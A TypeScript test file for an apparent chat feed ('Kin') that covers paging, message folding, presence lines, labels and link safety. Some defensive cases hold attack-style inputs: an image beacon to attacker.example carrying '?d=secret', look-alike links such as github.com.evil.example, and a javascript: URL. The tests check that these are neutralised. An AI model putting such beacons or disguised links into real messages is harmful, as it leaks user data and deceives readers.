import type { EnvironmentId, KinMessage, KinPresence, KinWidget } from "@t3tools/contracts";
import * as Cause from "effect/Cause";
import * as Option from "effect/Option";
import { AsyncResult } from "effect/reactivity";
import { describe, expect, it } from "vite-plus/test";

import {
  KIN_FIXTURE_AGENT,
  KIN_FIXTURE_CHAT_ID,
  KIN_FIXTURE_OWNER,
  KIN_FIXTURE_QA,
  makeKinFixtureMessages,
  readKinFixtureHistory,
} from "./kinChatFixtures";
import {
  buildKinFeedRows,
  initialKinPaging,
  KIN_HISTORY_PAGE_SIZE,
  kinActivePaging,
  kinChatScreenState,
  kinChatStatusLine,
  kinDayLabel,
  kinBodyMarkdown,
  kinImageSource,
  kinImageText,
  kinLinkToOpen,
  kinEarlierPage,
  kinMessageLabel,
  kinMessageLinks,
  kinMarkReadRearms,
  kinRowSeq,
  kinSeqToMarkRead,
  kinUnseenCount,
  mergeKinFeed,
  type KinFeedRow,
  type KinFeedViewer,
} from "./kinChatFeed";
import type { KinHost } from "./kinHost";
import { KIN_SLOW_START_AFTER_MS, kinPresenceLine, kinPresenceNeedsClock } from "./kinLive";
import { kinSentences } from "./kinScreenState";
import {
  applyKinChatEvent,
  applyKinChatHistory,
  emptyKinChat,
  type KinChatState,
} from "./kinInboxModel";

const all = makeKinFixtureMessages(500);
const viewer: KinFeedViewer = {
  personId: KIN_FIXTURE_OWNER,
  agentNames: new Map([[KIN_FIXTURE_AGENT, "Tech lead"]]),
};
const feed = (messages: ReadonlyArray<KinMessage>): KinChatState => ({
  ...emptyKinChat,
  messages,
});
const ownMessage = (seq: number) => all.find((m) => m.seq === seq && m.author._tag === "human")!;
const agentMessage = (seq: number, overrides: Partial<KinMessage> = {}) =>
  ({ ...all[1]!, messageId: `m${seq}`, seq, ...overrides }) as KinMessage;

describe("paging", () => {
  it("loads earlier pages of 50 until the first message, keeping every seq once", () => {
    const live = feed(all.slice(-KIN_HISTORY_PAGE_SIZE));
    let earlier = emptyKinChat;
    let exhausted = false;
    const pageSizes: number[] = [];
    for (;;) {
      const merged = mergeKinFeed(live, earlier);
      const request = kinEarlierPage(KIN_FIXTURE_CHAT_ID, merged.messages, exhausted);
      if (request === null) break;
      expect(request.beforeSeq).toBe(merged.messages[0]!.seq);
      const page = readKinFixtureHistory(all, request);
      pageSizes.push(page.messages.length);
      earlier = applyKinChatHistory(earlier, page);
      exhausted = !page.hasMore;
    }
    expect(pageSizes).toEqual(Array.from({ length: 9 }, () => 50));
    expect(mergeKinFeed(live, earlier).messages.map((m) => m.seq)).toEqual(all.map((m) => m.seq));
  });

  it("stops when the server says there is nothing older, even above seq 1", () => {
    expect(kinEarlierPage(KIN_FIXTURE_CHAT_ID, all.slice(10), true)).toBeNull();
    expect(kinEarlierPage(KIN_FIXTURE_CHAT_ID, [], false)).toBeNull();
  });

  it("prefers the stream's copy of a message an earlier page also holds", () => {
    const edited = { ...all[449]!, body: "edited live" };
    const merged = mergeKinFeed(feed([edited, ...all.slice(450)]), feed(all.slice(400, 450)));
    expect(merged.messages.find((m) => m.seq === 450)?.body).toBe("edited live");
    expect(merged.messages).toHaveLength(100);
  });

  it("drops earlier pages once a reset replaces the stream's feed, so no hole opens", () => {
    const live = feed(all.slice(-KIN_HISTORY_PAGE_SIZE));
    const page = readKinFixtureHistory(
      all,
      kinEarlierPage(KIN_FIXTURE_CHAT_ID, live.messages, false)!,
    );
    const paging = {
      ...initialKinPaging,
      earlier: applyKinChatHistory(emptyKinChat, page),
      anchorSeq: live.messages[0]!.seq,
    };
    expect(kinActivePaging(paging, live)).toBe(paging);
    // The stream reaching further back keeps them.
    expect(kinActivePaging(paging, feed(all.slice(-60)))).toBe(paging);
    // Reset: the stream emptied its feed and waits for the latest page.
    expect(kinActivePaging(paging, { ...emptyKinChat, needsHistoryReload: true })).toBe(
      initialKinPaging,
    );
    // The reloaded latest page starts past where the earlier pages were read.
    const reloaded = feed(all.slice(-10));
    expect(kinActivePaging(paging, reloaded)).toBe(initialKinPaging);
    expect(kinEarlierPage(KIN_FIXTURE_CHAT_ID, reloaded.messages, false)?.beforeSeq).toBe(491);
  });
});

// The stream merge keeps the highest revision too: `kinInboxModel.test.ts`.
describe("in-place widget updates", () => {
  const atRevision = (revision: number, status: string) =>
    ({
      widgetId: "w1",
      messageId: "m1",
      type: "task",
      revision,
      state: { status },
    }) as unknown as KinWidget;
  const withWidget = (state: KinChatState, widget: KinWidget): KinChatState => ({
    ...state,
    widgets: [widget],
  });
  const status = (state: KinChatState) => {
    expect(state.widgets).toHaveLength(1);
    return (state.widgets[0]!.state as { status: string }).status;
  };

  it("an earlier page's older copy never overwrites the stream's, and a newer one wins", () => {
    const live = withWidget(emptyKinChat, atRevision(3, "done"));
    expect(status(mergeKinFeed(live, withWidget(emptyKinChat, atRevision(2, "working"))))).toBe(
      "done",
    );
    expect(status(mergeKinFeed(live, withWidget(emptyKinChat, atRevision(4, "failed"))))).toBe(
      "failed",
    );
  });

  it("after a reset, a page read before it can't bring back a stale revision", () => {
    const earlier = withWidget(emptyKinChat, atRevision(2, "working"));
    let live = withWidget(emptyKinChat, atRevision(3, "done"));
    live = applyKinChatEvent(live, { _tag: "reset", lastSeq: 400 });
    live = applyKinChatHistory(live, {
      messages: [],
      widgets: [atRevision(3, "done")],
      hasMore: true,
    });
    expect(status(mergeKinFeed(live, earlier))).toBe("done");
  });
});
const localIso = (day: number, hour: number) => new Date(2026, 10, day, hour).toISOString();

// Days are covered on their own below; these cases read the rows within one day.
const messageRows = (...args: Parameters<typeof buildKinFeedRows>) =>
  buildKinFeedRows(...args).filter((row) => row.type !== "day");

describe("rows", () => {
  it("folds a run of agent messages into one line after the message before it", () => {
    // Seqs 22-24 of the fixture are one three-message floor run.
    const rows = messageRows(all.slice(19, 26), viewer, new Set());
    expect(rows.map((row) => row.type)).toEqual([
      "message",
      "message",
      "fold",
      "message",
      "message",
    ]);
    const fold = rows[2]!;
    expect(fold).toMatchObject({
      count: 3,
      decision: "Settled on a fixed timeout.",
      expanded: false,
    });
    expect(fold.type === "fold" && fold.authors).toEqual(["Tech lead", "Agent"]);
    expect(fold.key).toBe("fold:run-0");
    // On screen, a folded run counts as seen through its last message.
    expect(kinRowSeq(fold)).toBe(24);
  });

  it("keeps a deleted agent message inside its run's fold", () => {
    const messages = all
      .slice(19, 26)
      .map((m) => (m.seq === 23 ? { ...m, status: "deleted" as const } : m));
    const rows = messageRows(messages, viewer, new Set());
    expect(rows.map((row) => row.type)).toEqual([
      "message",
      "message",
      "fold",
      "message",
      "message",
    ]);
    expect(rows[2]).toMatchObject({ count: 3 });
  });

  it("reuses unchanged rows when a message arrives", () => {
    const messages = all.slice(0, 20);
    const before = buildKinFeedRows(messages, viewer, new Set());
    const after = buildKinFeedRows([...messages, all[20]!], viewer, new Set());
    expect(after).toHaveLength(before.length + 1);
    before.forEach((row, index) => expect(after[index]).toBe(row));
  });

  it("lists an expanded run's messages right after its fold line", () => {
    const rows = messageRows(all.slice(19, 26), viewer, new Set(["run-0"]));
    expect(rows.map((row) => (row.type === "message" ? row.message.seq : row.type))).toEqual([
      20,
      21,
      "fold",
      22,
      23,
      24,
      25,
      26,
    ]);
  });

  it("does not fold a single run message or a run broken by another author", () => {
    const run = { floorRunId: "r" };
    const rows = messageRows(
      [agentMessage(1, run), ownMessage(3), agentMessage(4, run)],
      viewer,
      new Set(),
    );
    expect(rows.every((row) => row.type === "message")).toBe(true);
  });

  it("shows the author line once per stretch of one author, never on own messages", () => {
    const rows = messageRows(
      [ownMessage(1), agentMessage(2), agentMessage(3), ownMessage(5), agentMessage(6)],
      viewer,
      new Set(),
    );
    expect(rows.map((row) => row.type === "message" && [row.own, row.showAuthor])).toEqual([
      [true, false],
      [false, true],
      [false, false],
      [true, false],
      [false, true],
    ]);
  });

  it("shows a choice tap as the owner's words instead of its JSON and card", () => {
    const tap = {
      ...all.find((m) => m.author._tag === "human")!,
      kind: "widget_action",
      widgetId: "choice:card",
      body: JSON.stringify({
        actionId: "choose",
        value: "option-1",
        text: 'Chose "Ship it" on "Ship?"',
      }),
    } as KinMessage;
    const other = { ...tap, messageId: "other-tap", body: '{"actionId":"keep"}' } as KinMessage;
    const [shown, kept] = messageRows([tap, other], viewer, new Set());
    expect(shown).toMatchObject({
      message: { body: 'Chose "Ship it" on "Ship?"', widgetId: null },
    });
    expect(kept).toMatchObject({
      message: { body: '{"actionId":"keep"}', widgetId: "choice:card" },
    });
  });

  it("hides dismissed suggestions and draws system messages as their own rows", () => {
    const rows = messageRows(
      [
        agentMessage(1),
        agentMessage(2, { status: "dismissed" }),
        agentMessage(3, { kind: "system", author: { _tag: "system" } }),
        agentMessage(4),
      ],
      viewer,
      new Set(),
    );
    expect(rows.map((row) => row.type === "message" && row.showAuthor)).toEqual([
      true,
      false,
      true,
    ]);
    expect(rows[1]!.type).toBe("system");
  });

  it("starts each local day with a separator and restarts author lines after it", () => {
    const rows = buildKinFeedRows(
      [
        agentMessage(1, { createdAt: localIso(7, 21) }),
        agentMessage(2, { createdAt: localIso(7, 22) }),
        agentMessage(3, { createdAt: localIso(8, 9) }),
        ownMessage(5),
      ].map((m, index) => (index === 3 ? { ...m, createdAt: localIso(8, 10) } : m)),
      viewer,
      new Set(),
    );
    expect(
      rows.map((row) =>
        row.type === "day" ? row.key : row.type === "message" ? row.showAuthor : row.type,
      ),
    ).toEqual(["day:2026-11-07", true, false, "day:2026-11-08", true, false]);
  });

  it("relabels day separators when the local day changes", () => {
    const messages = [agentMessage(1, { createdAt: localIso(8, 9) })];
    const dayOf = (now: Date) => buildKinFeedRows(messages, viewer, new Set(), now)[0];
    const today = dayOf(new Date(2026, 10, 8, 12));
    expect(dayOf(new Date(2026, 10, 8, 23))).toBe(today);
    expect(today).toMatchObject({ key: "day:2026-11-08", label: "Today" });
    expect(dayOf(new Date(2026, 10, 9, 0))).toMatchObject({
      key: "day:2026-11-08",
      label: "Yesterday",
    });
  });

  it("puts a fold under the day its run starts on", () => {
    const run = { floorRunId: "r" };
    const qa = {
      ...all[1]!.author,
      agentId: KIN_FIXTURE_QA,
      memberId: "member-qa",
    } as KinMessage["author"];
    const rows = buildKinFeedRows(
      [
        agentMessage(1, { createdAt: localIso(7, 9) }),
        agentMessage(2, { ...run, createdAt: localIso(8, 9) }),
        agentMessage(3, { ...run, author: qa, createdAt: localIso(8, 10) }),
      ],
      viewer,
      new Set(),
    );
    expect(rows.map((row) => row.type)).toEqual(["day", "message", "day", "fold"]);
  });
});

describe("streaming replies", () => {
  const reply = (seq: number, draftId: string, body: string) =>
    agentMessage(seq, { floorRunId: "r", clientMessageId: `reply:${draftId}`, body });
  const draft = (draftId: string, text: string) => ({
    draftId,
    agentId: KIN_FIXTURE_AGENT,
    text,
    startedAt: localIso(8, 9),
  });
  const shape = (rows: ReadonlyArray<KinFeedRow>) =>
    rows.map((row) =>
      row.type === "message" || row.type === "draft" ? [row.key, row.showAuthor] : row.type,
    );

  it("shows one agent's messages from a run as grouped bubbles, not a fold", () => {
    const rows = messageRows(
      [ownMessage(1), reply(2, "a", "First."), reply(3, "b", "Second.")],
      viewer,
      new Set(),
    );
    expect(shape(rows)).toEqual([
      ["fixture-1", false],
      ["reply:a", true],
      ["reply:b", false],
    ]);
  });

  it("keeps a draft's key and author line when its message lands, so the bubble stays put", () => {
    const before = [ownMessage(1), reply(2, "a", "First.")];
    const streaming = messageRows(before, viewer, new Set(), new Date(2026, 10, 8, 12), [
      draft("b", "Sec"),
    ]);
    const landed = messageRows([...before, reply(3, "b", "Second.")], viewer, new Set());
    expect(shape(streaming)).toEqual(shape(landed));
    expect(streaming[2]).toMatchObject({ type: "draft", authorLabel: "Tech lead" });
    expect(kinRowSeq(streaming[2]!)).toBe(0);
    // The first reply of a turn carries the author line while streaming and after.
    expect(
      shape(
        messageRows([ownMessage(1)], viewer, new Set(), new Date(2026, 10, 8, 12), [
          draft("a", "Fi"),
        ]),
      ),
    ).toEqual([
      ["fixture-1", false],
      ["reply:a", true],
    ]);
  });
});

describe("kinPresenceLine", () => {
  const start = Date.parse("2026-11-08T09:00:00.000Z");
  const iso = (ms: number) => new Date(start + ms).toISOString();
  const presence = (overrides: Partial<KinPresence> = {}): KinPresence => ({
    agentId: KIN_FIXTURE_AGENT,
    wakeupId: "w1" as KinPresence["wakeupId"],
    state: "thinking",
    label: null,
    startedAt: iso(0),
    since: iso(0),
    ...overrides,
  });
  const text = (p: KinPresence, at: number) => kinPresenceLine(p, start + at)?.text;

  it("names each state in one static line; a note or tool label wins", () => {
    expect(kinPresenceLine(undefined, start)).toBeNull();
    expect(text(presence(), 0)).toBe("Thinking…");
    expect(text(presence({ state: "writing" }), 0)).toBe("Writing…");
    expect(text(presence({ state: "working" }), 0)).toBe("Working…");
    expect(text(presence({ state: "working", label: "Checking memory" }), 0)).toBe(
      "Checking memory",
    );
    expect(text(presence({ state: "working", label: "x".repeat(80) }), 0)).toHaveLength(60);
    expect(kinPresenceNeedsClock(presence({ state: "working" }))).toBe(false);
  });

  it("shows a slow start's wait after 20 s, announcing it once", () => {
    const starting = presence({ state: "starting", since: iso(5_000) });
    expect(text(starting, KIN_SLOW_START_AFTER_MS - 1)).toBe("Starting…");
    expect(text(starting, KIN_SLOW_START_AFTER_MS)).toBe("Starting · 0:20");
    expect(text(starting, 35_000)).toBe("Starting · 0:35");
    expect(kinPresenceLine(starting, start + 20_000)?.announcement).toBe(
      kinPresenceLine(starting, start + 35_000)?.announcement,
    );
    expect(kinPresenceNeedsClock(starting)).toBe(true);
  });

  it("counts a stall's minutes from the last output, never under 2", () => {
    const stalled = presence({ state: "stalled", since: iso(60_000) });
    expect(kinPresenceLine(stalled, start + 60_000)).toMatchObject({
      text: "No output for 2 min",
      stalled: true,
      subtitle: "No output",
    });
    expect(text(stalled, 60_000 + 5 * 60_000 + 59_000)).toBe("No output for 5 min");
    expect(kinPresenceLine(stalled, start + 60_000)?.announcement).toBe(
      kinPresenceLine(stalled, start + 600_000)?.announcement,
    );
    expect(kinPresenceNeedsClock(stalled)).toBe(true);
  });
});

describe("kinDayLabel", () => {
  const now = new Date(2026, 10, 8, 12);
  it.each([
    ["earlier today", localIso(8, 0), "Today"],
    ["late yesterday", new Date(2026, 10, 7, 23, 59).toISOString(), "Yesterday"],
    [
      "earlier this year",
      localIso(3, 9),
      new Intl.DateTimeFormat(undefined, {
        weekday: "short",
        day: "numeric",
        month: "short",
      }).format(new Date(2026, 10, 3, 9)),
    ],
    [
      "another year",
      new Date(2025, 11, 31, 9).toISOString(),
      new Intl.DateTimeFormat(undefined, {
        day: "numeric",
        month: "short",
        year: "numeric",
      }).format(new Date(2025, 11, 31, 9)),
    ],
  ])("names %s", (_name, iso, label) => {
    expect(kinDayLabel(iso, now)).toBe(label);
  });
});

describe("message labels", () => {
  const row = (overrides: Partial<KinMessage>) =>
    messageRows([agentMessage(1, overrides)], viewer, new Set())[0] as Extract<
      KinFeedRow,
      { type: "message" }
    >;
  const ownRow = (body: string) =>
    messageRows([{ ...ownMessage(1), body }], viewer, new Set())[0] as Extract<
      KinFeedRow,
      { type: "message" }
    >;

  it.each([
    [
      "markdown reads as plain text",
      row({
        body: "Fixed and pushed. PR #212 is ready:\n\n- freezes the clock per test\n- drops the 2 s sleep",
      }),
      "Tech lead, agent. Fixed and pushed. PR #212 is ready: freezes the clock per test. drops the 2 s sleep. 9:30.",
    ],
    [
      "code fences keep their code",
      row({
        body: "Here's the plan:\n\n```ts\nconst timeout = Duration.seconds(10);\n```\n\nI'll start after lunch.",
      }),
      "Tech lead, agent. Here's the plan: const timeout = Duration.seconds(10); I'll start after lunch. 9:30.",
    ],
    [
      "own messages and emphasis",
      ownRow("Thanks. Let's keep the **fixed timeout** for now"),
      "You. Thanks. Let's keep the fixed timeout for now. 9:30.",
    ],
    [
      "link text, not its address",
      row({ body: "See [PR 212](https://github.com/o/r/pull/212) and `payments.test.ts`." }),
      "Tech lead, agent. See PR 212 and payments.test.ts. 9:30.",
    ],
    [
      "a suggestion says it isn't sent",
      row({ body: "Merge it?", status: "suggested" }),
      "Tech lead, agent. Merge it? 9:30. Suggestion, not sent yet.",
    ],
    [
      "an edit",
      row({ body: "Done", editedAt: "2026-11-08T09:31:00.000Z" }),
      "Tech lead, agent. Done. 9:30. Edited.",
    ],
    [
      "a deleted message",
      row({ body: "secret", status: "deleted" }),
      "Tech lead, agent. Message deleted. 9:30.",
    ],
    [
      "a card with a caption, which the card itself labels",
      row({ body: "Started", widgetId: "w1" as KinMessage["widgetId"] }),
      "Tech lead, agent. Started. 9:30.",
    ],
    [
      "a body ending in an ellipsis",
      row({ body: "Checking the logs…" }),
      "Tech lead, agent. Checking the logs… 9:30.",
    ],
  ])("%s", (_name, messageRow, label) => {
    expect(kinMessageLabel(messageRow, "9:30")).toBe(label);
  });

  it.each([
    ["adds a period", ["Task: Fix CI", "Working"], "Task: Fix CI. Working."],
    [
      "keeps a period",
      ["Exactly once.", "Waiting for connection"],
      "Exactly once. Waiting for connection.",
    ],
    ["keeps a question mark", ["Why is CI red?", "Working"], "Why is CI red? Working."],
    ["keeps an exclamation mark", ["Shipped!", "Done"], "Shipped! Done."],
    ["keeps an ellipsis", ["Thinking…", "Waiting"], "Thinking… Waiting."],
    ["trims before checking the end", ["Sent. ", null, "  ", "9:30"], "Sent. 9:30."],
  ])("kinSentences %s", (_name, parts, label) => {
    expect(kinSentences(parts)).toBe(label);
  });

  it("lists each link once, markdown and bare, for the bubble's actions", () => {
    expect(
      kinMessageLinks(
        "See [PR 212](https://github.com/o/r/pull/212), then https://t3.codes/docs. Also <https://a.b/c>",
      ),
    ).toEqual([
      { label: "PR 212", href: "https://github.com/o/r/pull/212" },
      { label: "https://t3.codes/docs", href: "https://t3.codes/docs" },
      { label: "https://a.b/c", href: "https://a.b/c" },
    ]);
    expect(kinMessageLinks("No links here.")).toEqual([]);
  });

  it.each([
    ["keeps GitHub link text", "[PR 212](https://github.com/o/r/pull/212)", "PR 212"],
    ["names a host other than GitHub", "[the docs](https://t3.codes/docs)", "the docs · t3.codes"],
    [
      "keeps text that shows the real host",
      "[t3.codes/docs](https://t3.codes/docs)",
      "t3.codes/docs",
    ],
    [
      "names the real host behind a look-alike",
      "[github.com/o/r](https://github.com.evil.example/o/r)",
      "github.com/o/r · github.com.evil.example",
    ],
    [
      "names the real host when GitHub text points elsewhere",
      "[github.com/o/r/pull/1](https://evil.example/pull/1)",
      "github.com/o/r/pull/1 · evil.example",
    ],
    [
      "names GitHub when the text names another host",
      "[t3.codes](https://github.com/o/r)",
      "t3.codes · github.com",
    ],
  ])("labels a link's action: %s", (_name, body, label) => {
    expect(kinMessageLinks(body).map((link) => link.label)).toEqual([label]);
  });

  it.each([
    ["a phone number", "[Call me](tel:+15551234)"],
    ["a text message", "[Text me](sms:+15551234)"],
    ["a T3 deep link", "[Open](t3code://threads/1)"],
    ["a script", "[Run](javascript:alert(1))"],
    ["a relative path", "[Notes](/notes/today)"],
    ["an image", "![pixel](https://attacker.example/p.png?d=secret)"],
  ])("offers no action for %s", (_name, body) => {
    expect(kinMessageLinks(body)).toEqual([]);
  });
});

describe("kinLinkToOpen", () => {
  it.each([
    ["https://github.com/o/r/pull/212", "https://github.com/o/r/pull/212"],
    ["http://localhost:3773/docs", "http://localhost:3773/docs"],
    ["tel:+15551234", null],
    ["sms:+15551234", null],
    ["t3code://threads/1", null],
    ["javascript:alert(1)", null],
    ["mailto:a@b.example", null],
    ["/notes/today", null],
    ["not a url", null],
  ])("%s", (href, opens) => {
    expect(kinLinkToOpen(href)).toBe(opens);
  });
});

describe("message images", () => {
  // `![](…?d=<data>)` in an agent's message would leak data if the chat fetched it on open.
  const image = { href: "https://attacker.example/p.png?d=secret", alt: "status", title: null };

  it.each([
    [
      "an inline image",
      "Done ![status](https://attacker.example/p.png?d=secret) ok",
      "Done Image: status ok",
    ],
    ["an image without alt", "![](https://attacker.example/p.png)", "Image"],
    [
      "a reference image",
      "![x][1]\n\n[1]: https://attacker.example/p.png",
      "Image: x\n\n[1]: https://attacker.example/p.png",
    ],
    ["an HTML image", 'a <IMG src="https://attacker.example/p.png"> b', "a Image b"],
    ["a plain link", "[docs](https://example.com)", "[docs](https://example.com)"],
  ])("renders %s as text before parsing", (_name, body, rendered) => {
    expect(kinBodyMarkdown(body)).toBe(rendered);
  });

  it("resolves no source, so the renderer requests nothing", () => {
    expect(kinImageSource()).toEqual({ uri: "" });
  });

  it.each([
    ["names its alt text", image, "Image: status"],
    ["falls back without alt text", { ...image, alt: null }, "Image"],
    ["ignores blank alt text", { ...image, alt: "  " }, "Image"],
  ])("draws a block image as text: %s", (_name, request, text) => {
    expect(kinImageText(request)).toBe(text);
  });
});

describe("kinSeqToMarkRead", () => {
  const base = { seesEnd: true, latestSeq: 9, markedSeq: 4, attemptedSeq: 4, unread: 2 };
  it.each([
    ["marks the latest seq when the reader sees the end", base, 9],
    ["waits while the reader is away from the end", { ...base, seesEnd: false }, null],
    ["sends a seq once", { ...base, markedSeq: 9 }, null],
    ["skips a chat with nothing unread", { ...base, unread: 0 }, null],
    ["marks before the inbox has counted unread", { ...base, unread: null }, 9],
    ["doesn't resend a seq the host refused", { ...base, attemptedSeq: 9 }, null],
    ["sends a seq that arrived after a refusal", { ...base, attemptedSeq: 7 }, 9],
  ] as const)("%s", (_name, input, seq) => {
    expect(kinSeqToMarkRead(input)).toBe(seq);
  });
});

describe("kinMarkReadRearms", () => {
  const away = { connected: false, focused: false };
  it.each([
    ["on reconnect", { connected: false, focused: true }, { connected: true, focused: true }, true],
    ["on refocus", { connected: true, focused: false }, { connected: true, focused: true }, true],
    [
      "not on a disconnect",
      { connected: true, focused: true },
      { connected: false, focused: true },
      false,
    ],
    ["not while nothing changed", away, away, false],
  ] as const)("rearms %s", (_name, was, now, rearms) => {
    expect(kinMarkReadRearms(was, now)).toBe(rearms);
  });
});

describe("new messages pill", () => {
  it("counts only others' messages past the seq the reader left the end at", () => {
    const messages = all.slice(0, 10);
    expect(kinUnseenCount(messages, 10, KIN_FIXTURE_OWNER)).toBe(0);
    // Seqs 7-10 alternate owner and lead.
    expect(kinUnseenCount(messages, 6, KIN_FIXTURE_OWNER)).toBe(2);
    expect(kinUnseenCount(messages, 6, null)).toBe(4);
  });
});

describe("kinChatScreenState", () => {
  const host = (connected: boolean): KinHost => ({
    _tag: "host",
    environmentId: "env" as EnvironmentId,
    connected,
    probe: connected ? { _tag: "ready", orgs: { orgs: [], me: [] } } : { _tag: "pending" },
  });
  const synced = (value: KinChatState, live = true) =>
    AsyncResult.success({ value, live, savedAt: null });

  it("shows a cached feed offline, and ends on left or closed", () => {
    expect(kinChatScreenState(host(false), synced(feed(all.slice(0, 3)), false))._tag).toBe(
      "ready",
    );
    expect(kinChatScreenState(host(false), null)._tag).toBe("offline");
    expect(kinChatScreenState(host(true), null)._tag).toBe("loading");
    expect(kinChatScreenState(host(true), synced({ ...emptyKinChat, left: true }))).toEqual({
      _tag: "gone",
      reason: "left",
    });
    expect(
      kinChatScreenState(host(true), synced({ ...emptyKinChat, closed: "not_found" })),
    ).toEqual({ _tag: "gone", reason: "not_found" });
  });

  it("keeps the loaded feed when its stream fails, with the error above it", () => {
    const loaded = synced(feed(all.slice(0, 3)));
    const failed = AsyncResult.failure(Cause.fail(new Error("Kin went away")), {
      previousSuccess: Option.some(loaded),
    });
    expect(kinChatScreenState(host(true), failed)).toMatchObject({
      _tag: "ready",
      error: "Kin went away",
    });
    expect(kinChatScreenState(host(false), failed)).toMatchObject({ _tag: "ready", error: null });
    expect(kinChatScreenState(host(true), synced(feed([])))).toMatchObject({ error: null });
  });
});

describe("kinChatStatusLine", () => {
  const task = (id: string, status: string, closedAt: string | null = null) =>
    ({
      widgetId: id,
      type: "task",
      closedAt,
      state: {
        taskId: id,
        environmentId: "env",
        threadId: null,
        remoteEnvironmentId: null,
        title: "Fix payments test",
        model: null,
        status,
        pullRequests: [],
        lastError: null,
        updatedAt: "2026-11-08T09:00:00.000Z",
      },
    }) as unknown as KinWidget;

  it("counts open working tasks only", () => {
    expect(kinChatStatusLine([])).toBeNull();
    expect(kinChatStatusLine([task("a", "working"), task("b", "done")])).toBe("Working on 1 task");
    expect(
      kinChatStatusLine([
        task("a", "working"),
        task("b", "working"),
        task("c", "working", "2026-11-08T09:00:00.000Z"),
      ]),
    ).toBe("Working on 2 tasks");
  });
});
